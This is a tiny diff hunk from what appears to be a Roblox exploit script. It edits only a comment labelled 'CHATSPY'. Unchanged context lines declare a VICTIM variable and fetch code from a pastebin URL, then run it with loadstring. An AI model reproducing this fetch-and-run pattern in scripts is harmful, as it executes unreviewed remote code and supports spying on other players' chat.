@@ -11,7 +11,7 @@ local tweeninfo = TweenInfo.new(0.5)
 local RS = game:GetService("RunService")
 local VICTIM = nil
 
--- CHATSPY
+-- CHATSPY --
 loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
 
 local function getFullUser(input)
